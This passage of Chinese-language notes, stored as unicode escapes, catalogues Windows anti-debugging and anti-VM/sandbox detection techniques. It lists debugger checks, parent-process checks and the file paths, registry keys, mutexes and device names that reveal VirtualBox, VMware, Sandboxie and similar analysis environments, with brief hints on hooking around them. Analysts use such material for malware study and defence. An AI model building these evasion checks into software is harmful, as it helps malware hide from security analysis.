kernel32!OutputDebugStringW \u6302\u94a9\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u8f93\u5165\u53c2\u6570\u5e76\u4fee\u6539\u539f\u59cb\u51fd\u6570\u7684\u884c\u4e3a\u3002 \u6742\u9879 FindWindow \u8be5\u6280\u672f\u5305\u62ec\u7cfb\u7edf\u4e2d\u7a97\u53e3\u7c7b\u7684\u7b80\u5355\u679a\u4e3e\uff0c\u5e76\u5c06\u5b83\u4eec\u4e0e\u8c03\u8bd5\u5668\u7684\u5df2\u77e5\u7a97\u53e3\u7c7b\u8fdb\u884c\u6bd4\u8f83\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u51fd\u6570\uff1a user32!FindWindowW() user32!FindWindowA() user32!FindWindowExW() user32!FindWindowExA() \u7236\u8fdb\u7a0b\u68c0\u67e5 \u901a\u5e38\uff0c\u7528\u6237\u6a21\u5f0f\u8fdb\u7a0b\u662f\u901a\u8fc7\u53cc\u51fb\u6587\u4ef6\u56fe\u6807\u6765\u6267\u884c\u7684\u3002 \u5982\u679c\u8fdb\u7a0b\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u6267\u884c\uff0c\u5176\u7236\u8fdb\u7a0b\u5c06\u662fshell\u8fdb\u7a0b\uff08\u201cexplorer.exe\u201d\uff09\u3002 \u4ee5\u4e0b\u4e24\u79cd\u65b9\u6cd5\u7684\u4e3b\u8981\u601d\u60f3\u662f\u5c06\u7236\u8fdb\u7a0b\u7684PID\u4e0e\u201cexplorer.exe\u201d\u7684PID\u8fdb\u884c\u6bd4\u8f83\u3002 NtQueryInformationProcess \u8be5\u65b9\u6cd5\u5305\u62ec\u4f7f\u7528 user32!GetShellWindow() \u83b7\u53d6 shell \u8fdb\u7a0b\u7a97\u53e3\u53e5\u67c4\uff0c\u5e76\u901a\u8fc7\u8c03\u7528 user32!GetWindowThreadProcessId() \u83b7\u53d6\u5176\u8fdb\u7a0b ID\u3002 \u7136\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 ProcessBasicInformation \u7c7b\u8c03\u7528 ntdll!NtQueryInformationProcess() \u4ece PROCESS_BASIC_INFORMATION \u7ed3\u6784\u4e2d\u83b7\u53d6\u7236\u8fdb\u7a0b ID\u3002 CreateToolhelp32Snapshot \u53ef\u4ee5\u4f7f\u7528 kernel32!CreateToolhelp32Snapshot() \u548c kernel32!Process32Next() \u51fd\u6570\u83b7\u53d6\u7236\u8fdb\u7a0b ID \u548c\u7236\u8fdb\u7a0b\u540d\u79f0\u3002 \u9009\u62e9\u5668 \u9009\u62e9\u5668\u503c\u53ef\u80fd\u770b\u8d77\u6765\u5f88\u7a33\u5b9a\uff0c\u4f46\u5b9e\u9645\u4e0a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u5b83\u4eec\u662f\u4e0d\u7a33\u5b9a\u7684\uff0c\u5e76\u4e14\u8fd8\u53d6\u51b3\u4e8e Windows \u7684\u7248\u672c\u3002 \u4f8b\u5982\uff0c\u53ef\u4ee5\u5728\u7ebf\u7a0b\u5185\u8bbe\u7f6e\u9009\u62e9\u5668\u503c\uff0c\u4f46\u5b83\u53ef\u80fd\u4e0d\u4f1a\u957f\u65f6\u95f4\u4fdd\u7559\u8be5\u503c\u3002 \u67d0\u4e9b\u4e8b\u4ef6\u53ef\u80fd\u4f1a\u5bfc\u81f4\u9009\u62e9\u5668\u503c\u66f4\u6539\u56de\u5176\u9ed8\u8ba4\u503c\u3002 \u5176\u4e2d\u4e00\u4e2a\u4e8b\u4ef6\u662f\u4e00\u4e2a\u4f8b\u5916\u3002 \u5728\u8c03\u8bd5\u5668\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u5355\u6b65\u5f02\u5e38\u4ecd\u7136\u662f\u4e00\u4e2a\u5f02\u5e38\uff0c\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u610f\u5916\u7684\u884c\u4e3a\u3002 DbgPrint ntdll!DbgPrint() \u548c kernel32!OutputDebugStringW() \u7b49\u8c03\u8bd5\u51fd\u6570\u4f1a\u5bfc\u81f4\u5f02\u5e38 DBG_PRINTEXCEPTION_C (0x40010006) \u3002 \u5982\u679c\u7a0b\u5e8f\u662f\u4f7f\u7528\u9644\u52a0\u7684\u8c03\u8bd5\u5668\u6267\u884c\u7684\uff0c\u5219\u8c03\u8bd5\u5668\u5c06\u5904\u7406\u6b64\u5f02\u5e38\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6ca1\u6709\u8c03\u8bd5\u5668\uff0c\u5e76\u4e14\u6ce8\u518c\u4e86\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u5219\u8be5\u5f02\u5e38\u5c06\u88ab\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u6355\u83b7\u3002 DbgSetDebugFilterState \u51fd\u6570 ntdll!DbgSetDebugFilterState() \u548c ntdll!NtSetDebugFilterState() \u4ec5\u8bbe\u7f6e\u4e00\u4e2a\u6807\u5fd7\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5c06\u68c0\u67e5\u8be5\u6807\u5fd7\u662f\u5426\u4e3a\u5185\u6838\u6a21\u5f0f\u8c03\u8bd5\u5668\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u7cfb\u7edf\u9644\u52a0\u4e86\u5185\u6838\u8c03\u8bd5\u5668\uff0c\u8fd9\u4e9b\u529f\u80fd\u5c31\u4f1a\u6210\u529f\u3002 \u7136\u800c\uff0c\u7531\u4e8e\u67d0\u4e9b\u7528\u6237\u6a21\u5f0f\u8c03\u8bd5\u5668\u5f15\u8d77\u7684\u526f\u4f5c\u7528\uff0c\u8fd9\u4e9b\u51fd\u6570\u4e5f\u53ef\u80fd\u6210\u529f\u3002 \u8fd9\u4e9b\u529f\u80fd\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002 NtYieldExecution/ SwitchToThread \u8fd9\u79cd\u65b9\u6cd5\u5e76\u4e0d\u771f\u6b63\u53ef\u9760\uff0c\u56e0\u4e3a\u5b83\u53ea\u663e\u793a\u5f53\u524d\u8fdb\u7a0b\u4e2d\u662f\u5426\u5b58\u5728\u9ad8\u4f18\u5148\u7ea7\u7ebf\u7a0b\u3002 \u7136\u800c\uff0c\u5b83\u53ef\u4ee5\u7528\u4f5c\u53cd\u8ddf\u8e2a\u6280\u672f\u3002 \u5f53\u5728\u8c03\u8bd5\u5668\u4e2d\u8ddf\u8e2a\u5e94\u7528\u7a0b\u5e8f\u5e76\u6267\u884c\u5355\u6b65\u65f6\uff0c\u4e0a\u4e0b\u6587\u65e0\u6cd5\u5207\u6362\u5230\u5176\u4ed6\u7ebf\u7a0b\u3002 \u8fd9\u610f\u5473\u7740 ntdll!NtYieldExecution() \u8fd4\u56de STATUS_NO_YIELD_PERFORMED (0x40000024) \uff0c\u8fd9\u4f1a\u5bfc\u81f4 kernel32!SwitchToThread() \u8fd4\u56de\u96f6\u3002 \u4f7f\u7528\u6b64\u6280\u672f\u7684\u7b56\u7565\u662f\uff0c\u5982\u679c kernel32!SwitchToThread() \u8fd4\u56de\u96f6\uff0c\u6216\u8005 ntdll!NtYieldExecution() \u8fd4\u56de STATUS_NO_YIELD_PERFORMED \uff0c\u5219\u6709\u4e00\u4e2a\u5faa\u73af\u4fee\u6539\u67d0\u4e9b\u8ba1\u6570\u5668\u3002 \u8fd9\u53ef\u4ee5\u662f\u89e3\u5bc6\u5b57\u7b26\u4e32\u7684\u5faa\u73af\uff0c\u4e5f\u53ef\u4ee5\u662f\u5e94\u8be5\u5728\u8c03\u8bd5\u5668\u4e2d\u624b\u52a8\u5206\u6790\u7684\u5176\u4ed6\u5faa\u73af\u3002 \u5982\u679c\u8ba1\u6570\u5668\u5728\u79bb\u5f00\u5faa\u73af\u540e\u5177\u6709\u9884\u671f\u503c\uff08\u5373\u6240\u6709 kernel32!SwitchToThread() \u8fd4\u56de\u96f6\u65f6\u7684\u9884\u671f\u503c\uff09\uff0c\u6211\u4eec\u8ba4\u4e3a\u8c03\u8bd5\u5668\u5b58\u5728\u3002 \u5728\u4e0b\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5355\u5b57\u8282\u8ba1\u6570\u5668\uff08\u4ee5 0 \u521d\u59cb\u5316\uff09\uff0c\u5982\u679c kernel32!SwitchToThread \u8fd4\u56de\u96f6\uff0c\u5219\u8be5\u8ba1\u6570\u5668\u5411\u5de6\u79fb\u52a8\u4e00\u4f4d\u3002 \u5982\u679c\u79fb\u4f4d 8 \u6b21\uff0c\u5219\u8ba1\u6570\u5668\u7684\u503c\u5c06\u53d8\u4e3a 0\uff0c\u5e76\u4e14\u8ba4\u4e3a\u8c03\u8bd5\u5668\u5b58\u5728\u3002 VirtualAlloc/ GetWriteWatch \u8fd9\u9879\u6280\u672f\u88ab\u63cf\u8ff0\u4e3a\u5bf9\u8457\u540d\u7684 al-khaser \u89e3\u51b3\u65b9\u6848\u7684\u5efa\u8bae\uff0c\u8be5\u89e3\u51b3\u65b9\u6848\u662f\u4e00\u79cd\u9488\u5bf9\u8bb8\u591a\u7c7b\u4f3c\u6076\u610f\u8f6f\u4ef6\u7684\u9632\u5fa1\u6d4b\u8bd5\u865a\u62df\u673a\u3001\u8c03\u8bd5\u5668\u3001\u6c99\u7bb1\u3001\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u7b49\u7684\u5de5\u5177\u3002 \u8fd9\u4e2a\u60f3\u6cd5\u6765\u81ea GetWriteWatch \u51fd\u6570\u7684\u6587\u6863\uff0c\u5176\u4e2d\u201c\u5907\u6ce8\u201d\u90e8\u5206\u8bf4\u660e\u4e86\u4ee5\u4e0b\u5185\u5bb9\uff1a \u201c\u5f53\u4f60\u8c03\u7528VirtualAlloc\u51fd\u6570\u6765\u4fdd\u7559\u6216\u63d0\u4ea4\u5185\u5b58\u65f6\uff0c\u4f60\u53ef\u4ee5\u6307\u5b9a MEM_WRITE_WATCH \u3002 \u8be5\u503c\u4f7f\u7cfb\u7edf\u8ddf\u8e2a\u5199\u5165\u5df2\u63d0\u4ea4\u5185\u5b58\u533a\u57df\u7684\u9875\u9762\u3002 \u60a8\u53ef\u4ee5\u8c03\u7528 GetWriteWatch \u51fd\u6570\u6765\u68c0\u7d22\u81ea\u533a\u57df\u5206\u914d\u6216\u5199\u5165\u8ddf\u8e2a\u72b6\u6001\u91cd\u7f6e\u4ee5\u6765\u5df2\u5199\u5165\u7684\u9875\u9762\u7684\u5730\u5740\u3002 \u6b64\u529f\u80fd\u53ef\u7528\u4e8e\u8ddf\u8e2a\u53ef\u80fd\u4fee\u6539\u9884\u671f\u6a21\u5f0f\u4e4b\u5916\u7684\u5185\u5b58\u9875\u7684\u8c03\u8bd5\u5668\u3002 \u7ed3\u8bba \u624b\u52a8\u8ddf\u8e2a\uff0cnop\u6389\u5173\u952e\u6307\u4ee4 \u53cd\u865a\u62df\u673a https://evasions.checkpoint.com/ \u6587\u4ef6\u7cfb\u7edf \u68c0\u67e5\u7279\u5b9a\u6587\u4ef6\u662f\u5426\u5b58\u5728 GetFileAttributes \u6b64\u65b9\u6cd5\u5229\u7528\u5e38\u89c1\u4e3b\u673a\u7cfb\u7edf\u548c\u865a\u62df\u73af\u5883\u4e2d\u5b58\u5728\u7684\u6587\u4ef6\u7684\u5dee\u5f02\u3002 \u865a\u62df\u73af\u5883\u4e2d\u5b58\u5728\u5f88\u591a\u7279\u5b9a\u4e8e\u6b64\u7c7b\u7cfb\u7edf\u7684\u6587\u4ef6\u5de5\u4ef6\u3002 \u8fd9\u4e9b\u6587\u4ef6\u4e0d\u5b58\u5728\u4e8e\u672a\u5b89\u88c5\u865a\u62df\u73af\u5883\u7684\u666e\u901a\u4e3b\u673a\u7cfb\u7edf\u4e0a\u3002 \u901a\u7528\u865a\u62df\u673a c:\\[60 random hex symbols] \u7528\u4e8e\u7f16\u7801\u7684 PC \u7279\u6709\u7684\u6587\u4ef6 c:\\take_screenshot.ps1 c:\\loaddll.exe c:\\email.doc c:\\email.htm c:\\123\\email.doc c:\\123\\email.docx c:\\a\\foobar.bmp c:\\a\\foobar.doc c:\\a\\foobar.gif c:\\symbols\\aagmmc.pdb Parallels c:\\windows\\system32\\drivers\\prleth.sys \u7f51\u7edc\u9002\u914d\u5668 c:\\windows\\system32\\drivers\\prlfs.sys c:\\windows\\system32\\drivers\\prlmouse.sys \u9f20\u6807\u540c\u6b65\u5de5\u5177 c:\\windows\\system32\\drivers\\prlvideo.sys c:\\windows\\system32\\drivers\\prltime.sys \u65f6\u95f4\u540c\u6b65\u9a71\u52a8 c:\\windows\\system32\\drivers\\prl_pv32.sys \u534a\u865a\u62df\u5316\u9a71\u52a8\u7a0b\u5e8f c:\\windows\\system32\\drivers\\prl_paravirt_32.sys \u534a\u865a\u62df\u5316\u9a71\u52a8\u7a0b\u5e8f VirtualBox c:\\windows\\system32\\drivers\\VBoxMouse.sys c:\\windows\\system32\\drivers\\VBoxGuest.sys c:\\windows\\system32\\drivers\\VBoxSF.sys c:\\windows\\system32\\drivers\\VBoxVideo.sys c:\\windows\\system32\\vboxdisp.dll c:\\windows\\system32\\vboxhook.dll c:\\windows\\system32\\vboxmrxnp.dll c:\\windows\\system32\\vboxogl.dll c:\\windows\\system32\\vboxoglarrayspu.dll c:\\windows\\system32\\vboxoglcrutil.dll c:\\windows\\system32\\vboxoglerrorspu.dll c:\\windows\\system32\\vboxoglfeedbackspu.dll c:\\windows\\system32\\vboxoglpackspu.dll c:\\windows\\system32\\vboxoglpassthroughspu.dll c:\\windows\\system32\\vboxservice.exe c:\\windows\\system32\\vboxtray.exe c:\\windows\\system32\\VBoxControl.exe VirtualPC c:\\windows\\system32\\drivers\\vmsrvc.sys c:\\windows\\system32\\drivers\\vpc-s3.sys VMware c:\\windows\\system32\\drivers\\vmmouse.sys PS/2 \u8bbe\u5907\u9a71\u52a8 c:\\windows\\system32\\drivers\\vmnet.sys c:\\windows\\system32\\drivers\\vmxnet.sys PCI\u7f51\u7edc\u9002\u914d\u5668 c:\\windows\\system32\\drivers\\vmhgfs.sys HGFS \u6587\u4ef6\u7cfb\u7edf\u9a71\u52a8 c:\\windows\\system32\\drivers\\vmx86.sys c:\\windows\\system32\\drivers\\hgfs.sys \u68c0\u67e5\u7279\u5b9a\u76ee\u5f55\u662f\u5426\u5b58\u5728 GetFileAttributes \u6b64\u65b9\u6cd5\u5229\u7528\u5e38\u89c1\u4e3b\u673a\u7cfb\u7edf\u548c\u865a\u62df\u73af\u5883\u4e2d\u5b58\u5728\u7684\u76ee\u5f55\u7684\u5dee\u5f02\u3002 \u865a\u62df\u73af\u5883\u4e2d\u5b58\u5728\u5f88\u591a\u7279\u5b9a\u4e8e\u6b64\u7c7b\u7cfb\u7edf\u7684\u76ee\u5f55\u3002 \u8fd9\u4e9b\u76ee\u5f55\u4e0d\u5b58\u5728\u4e8e\u672a\u5b89\u88c5\u865a\u62df\u73af\u5883\u7684\u666e\u901a\u4e3b\u673a\u7cfb\u7edf\u4e0a\u3002 CWSandbox c:\\analysis VirtualBox %PROGRAMFILES%\\oracle\\virtualbox guest additions\\ VMware %PROGRAMFILES%\\VMware\\ \u68c0\u67e5\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\u662f\u5426\u5305\u542b\u7279\u5b9a\u5b57\u7b26\u4e32\u4e4b\u4e00 - GetModuleFileName - GetProcessImageFileNameA/W - QueryFullProcessImageName \u6b64\u65b9\u6cd5\u4f9d\u8d56\u4e8e\u5728\u865a\u62df\u73af\u5883\u4e2d\u542f\u52a8\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7279\u6027\u3002 \u67d0\u4e9b\u73af\u5883\u4ece\u7279\u5b9a\u8def\u5f84\u542f\u52a8\u53ef\u6267\u884c\u6587\u4ef6 - \u6076\u610f\u8f6f\u4ef6\u6837\u672c\u4f1a\u68c0\u67e5\u8fd9\u4e9b\u8def\u5f84\u3002 \u68c0\u67e5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u5426\u4ece\u7279\u5b9a\u76ee\u5f55\u8fd0\u884c \u81ea\u5b9a\u4e49\u4ee3\u7801\uff0c\u65e0\u7279\u5b9aAPI \u68c0\u67e5\u7269\u7406\u78c1\u76d8\u9a71\u52a8\u5668\u7684\u6839\u76ee\u5f55\u4e2d\u662f\u5426\u5b58\u5728\u5177\u6709\u7279\u5b9a\u540d\u79f0\u7684\u53ef\u6267\u884c\u6587\u4ef6 GetFileAttributes \u6ce8\u518c\u8868 \u5e38\u7528\u51fd\u6570 - RegOpenKey - RegOpenKeyEx - RegQueryValue - RegQueryValueEx - RegCloseKey - RegEnumKeyEx - NtOpenKey - NtEnumerateKey - NtQueryValueKey - NtClose \u68c0\u67e5\u7279\u5b9a\u6ce8\u518c\u8868\u8def\u5f84\u662f\u5426\u5b58\u5728 \u901a\u7528 HKLM\\Software\\Classes\\Folder\\shell\\sandbox Hyper-V HKLM\\SOFTWARE\\Microsoft\\Hyper-V HKLM\\SOFTWARE\\Microsoft\\VirtualMachine HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters HKLM\\SYSTEM\\ControlSet001\\Services\\vmicheartbeat HKLM\\SYSTEM\\ControlSet001\\Services\\vmicvss HKLM\\SYSTEM\\ControlSet001\\Services\\vmicshutdown HKLM\\SYSTEM\\ControlSet001\\Services\\vmicexchange Parallels HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_1AB8* Sandboxie HKLM\\SYSTEM\\CurrentControlSet\\Services\\SbieDrv HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Sandboxie VirtualBox HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_80EE* HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX__ HKLM\\HARDWARE\\ACPI\\FADT\\VBOX__ HKLM\\HARDWARE\\ACPI\\RSDT\\VBOX__ HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxService HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxSF HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxVideo VirtualPC HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_5333* HKLM\\SYSTEM\\ControlSet001\\Services\\vpcbus HKLM\\SYSTEM\\ControlSet001\\Services\\vpc-s3 HKLM\\SYSTEM\\ControlSet001\\Services\\vpcuhub HKLM\\SYSTEM\\ControlSet001\\Services\\msvmmouf VMware HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_15AD* HKCU\\SOFTWARE\\VMware, Inc.\\VMware Tools HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools HKLM\\SYSTEM\\ControlSet001\\Services\\vmdebug HKLM\\SYSTEM\\ControlSet001\\Services\\vmmouse HKLM\\SYSTEM\\ControlSet001\\Services\\VMTools HKLM\\SYSTEM\\ControlSet001\\Services\\VMMEMCTL HKLM\\SYSTEM\\ControlSet001\\Services\\vmware HKLM\\SYSTEM\\ControlSet001\\Services\\vmci HKLM\\SYSTEM\\ControlSet001\\Services\\vmx86 HKLM\\SYSTEM\\CurrentControlSet\\Enum\\IDE\\CdRomNECVMWar_VMware_IDE_CD* HKLM\\SYSTEM\\CurrentControlSet\\Enum\\IDE\\CdRomNECVMWar_VMware_SATA_CD* HKLM\\SYSTEM\\CurrentControlSet\\Enum\\IDE\\DiskVMware_Virtual_IDE_Hard_Drive* HKLM\\SYSTEM\\CurrentControlSet\\Enum\\IDE\\DiskVMware_Virtual_SATA_Hard_Drive* Wine HKCU\\SOFTWARE\\Wine HKLM\\SOFTWARE\\Wine Xen HKLM\\HARDWARE\\ACPI\\DSDT\\xen HKLM\\HARDWARE\\ACPI\\FADT\\xen HKLM\\HARDWARE\\ACPI\\RSDT\\xen HKLM\\SYSTEM\\ControlSet001\\Services\\xenevtchn HKLM\\SYSTEM\\ControlSet001\\Services\\xennet HKLM\\SYSTEM\\ControlSet001\\Services\\xennet6 HKLM\\SYSTEM\\ControlSet001\\Services\\xensvc HKLM\\SYSTEM\\ControlSet001\\Services\\xenvdb \u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\uff0c\u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u4f1a\u679a\u4e3e\u5b50\u9879\u5e76\u68c0\u67e5\u5b50\u9879\u7684\u540d\u79f0\u662f\u5426\u5305\u542b\u67d0\u4e9b\u5b57\u7b26\u4e32\uff0c\u800c\u4e0d\u662f\u68c0\u67e5\u6307\u5b9a\u7684\u9879\u662f\u5426\u5b58\u5728\u3002 \u4f8b\u5982\uff1a\u679a\u4e3e\u201cHKLM\\SYSTEM\\ControlSet001\\Services\\\u201d\u7684\u5b50\u9879\u5e76\u641c\u7d22\u201cVBox\u201d\u5b57\u7b26\u4e32\u3002 \u68c0\u67e5\u7279\u5b9a\u6ce8\u518c\u8868\u9879\u662f\u5426\u5305\u542b\u6307\u5b9a\u5b57\u7b26\u4e32 \u901a\u7528 HKLM\\HARDWARE\\Description\\System SystemBiosDate 06/23/99 HKLM\\HARDWARE\\Description\\System\\BIOS SystemProductName A M I BOCHS HKLM\\HARDWARE\\Description\\System SystemBiosVersion BOCHS HKLM\\HARDWARE\\Description\\System VideoBiosVersion BOCHS Anubis HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion ProductID 76487-337-8429955-22614 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion ProductID 76487-337-8429955-22614 CwSandbox HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion ProductID 76487-644-3177037-23510 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion ProductID 76487-644-3177037-23510 JoeBox HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion ProductID 55274-640-2673064-23950 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion ProductID 55274-640-2673064-23950 Parallels HKLM\\HARDWARE\\Description\\System SystemBiosVersion PARALLELS HKLM\\HARDWARE\\Description\\System VideoBiosVersion PARALLELS QEMU HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier QEMU HKLM\\HARDWARE\\Description\\System SystemBiosVersion QEMU HKLM\\HARDWARE\\Description\\System VideoBiosVersion QEMU HKLM\\HARDWARE\\Description\\System\\BIOS SystemManufacturer QEMU VirtualBox HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VBOX HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VBOX HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VBOX HKLM\\HARDWARE\\Description\\System SystemBiosVersion VBOX HKLM\\HARDWARE\\Description\\System VideoBiosVersion VIRTUALBOX HKLM\\HARDWARE\\Description\\System\\BIOS SystemProductName VIRTUAL HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum DeviceDesc VBOX HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum FriendlyName VBOX HKLM\\SYSTEM\\ControlSet002\\Services\\Disk\\Enum DeviceDesc VBOX HKLM\\SYSTEM\\ControlSet002\\Services\\Disk\\Enum FriendlyName VBOX HKLM\\SYSTEM\\ControlSet003\\Services\\Disk\\Enum DeviceDesc VBOX HKLM\\SYSTEM\\ControlSet003\\Services\\Disk\\Enum FriendlyName VBOX HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation SystemProductName VIRTUAL HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation SystemProductName VIRTUALBOX VMware HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VMWARE HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VMWARE HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 Identifier VMWARE HKLM\\HARDWARE\\Description\\System SystemBiosVersion VMWARE HKLM\\HARDWARE\\Description\\System SystemBiosVersion INTEL - 6040000 HKLM\\HARDWARE\\Description\\System VideoBiosVersion VMWARE HKLM\\HARDWARE\\Description\\System\\BIOS SystemProductName VMware HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum 0 VMware HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum 1 VMware HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum DeviceDesc VMware HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum FriendlyName VMware HKLM\\SYSTEM\\ControlSet002\\Services\\Disk\\Enum DeviceDesc VMware HKLM\\SYSTEM\\ControlSet002\\Services\\Disk\\Enum FriendlyName VMware HKLM\\SYSTEM\\ControlSet003\\Services\\Disk\\Enum DeviceDesc VMware HKLM\\SYSTEM\\ControlSet003\\Services\\Disk\\Enum FriendlyName VMware HKCR\\Installer\\Products ProductName vmware tools HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall DisplayName vmware tools HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall DisplayName vmware tools HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall DisplayName vmware tools HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000 CoInstallers32 *vmx* HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000 DriverDesc VMware* HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000 InfSection vmx* HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000 ProviderName VMware* HKLM\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings Device Description VMware* HKLM\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation SystemProductName VMWARE HKLM\\SYSTEM\\CurrentControlSet\\Control\\Video\\{GUID}\\Video Service vm3dmp HKLM\\SYSTEM\\CurrentControlSet\\Control\\Video\\{GUID}\\Video Service vmx_svga HKLM\\SYSTEM\\CurrentControlSet\\Control\\Video\\{GUID}\\0000 Device Description VMware SVGA* Xen HKLM\\HARDWARE\\Description\\System\\BIOS SystemProductName Xen \u5982\u4f55\u53cd\u53cd\u8c03\u8bd5 \u5982\u679c\u68c0\u67e5\u4e86\u6307\u6807\uff08\u8868\u4e2d\u7684\u6ce8\u518c\u8868\u5b57\u7b26\u4e32\uff09\uff0c\u5219\u6302\u94a9\u76ee\u6807\u51fd\u6570\u5e76\u8fd4\u56de\u9002\u5f53\u7684\u7ed3\u679c\u3002 \u64cd\u4f5c\u7cfb\u7edf\u901a\u7528\u67e5\u8be2 \u67e5\u8be2\u7279\u5b9a\u7528\u6237\u540d GetUserNameA/W \u67e5\u8be2\u7279\u5b9a\u4e3b\u673a\u540d GetComputerNameA/W \u67e5\u8be2\u7279\u5b9a\u8ba1\u7b97\u673a\u540d GetComputerNameExA/W \u67e5\u8be2\u5185\u5b58\u5bb9\u91cf\u662f\u4e0d\u662f\u5f88\u4f4e GetMemoryStatusEx \u67e5\u8be2\u5c4f\u5e55\u5206\u8fa8\u7387\u662f\u4e0d\u662f\u4e0d\u6b63\u5e38 GetDesktopWindow GetWindowRect GetSystemMetrics SystemParametersInfo GetMonitorInfo \u67e5\u8be2\u8fdb\u7a0bID\u662f\u4e0d\u662f\u5f88\u4f4e GetSystemInfo \u67e5\u8be2\u663e\u793a\u5668\u662f\u4e0d\u662f\u5f88\u5c11 EnumDisplayMonitors GetSystemMetrics \u67e5\u8be2\u786c\u76d8\u7a7a\u95f4\u662f\u4e0d\u662f\u5f88\u5c11 DeviceIoControl GetDiskFreeSpaceExA/W \u67e5\u8be2\u7cfb\u7edf\u542f\u52a8\u65f6\u95f4\u662f\u4e0d\u662f\u5f88\u77ed GetTickCount GetTickCount64 NtQuerySystemInformation \u67e5\u8be2\u7cfb\u7edf\u662f\u4e0d\u662f\u4ece\u865a\u62df\u786c\u76d8\u542f\u52a8(Win8\u4ee5\u4e0a) IsNativeVhdBoot \u5982\u4f55\u53cd\u53cd\u8c03\u8bd5 hook\u51fd\u6570 \u5168\u5c40\u7cfb\u7edf\u5bf9\u8c61 \u68c0\u67e5\u5168\u5c40\u4e92\u65a5\u4f53 CreateMutexA/W OpenMutexA/W DeepFreeze Frz_State Sandboxie SandboxieSandboxie_SingleInstanceMutex_Control SBIE_BOXED_ServiceInitComplete_Mutex1 VirtualPC MicrosoftVirtualPC7UserServiceMakeSureWe'reTheOnlyOneMutex \u68c0\u67e5\u7279\u5b9a\u865a\u62df\u8bbe\u5907 NtCreateFile VirtualBox \\\\.\\VBoxMiniRdDN \\\\.\\VBoxMiniRdrDN \\\\.\\VBoxGuest \\\\.\\VBoxTrayIPC \\\\.\\VBoxMouse \\\\.\\VBoxVideo VMware 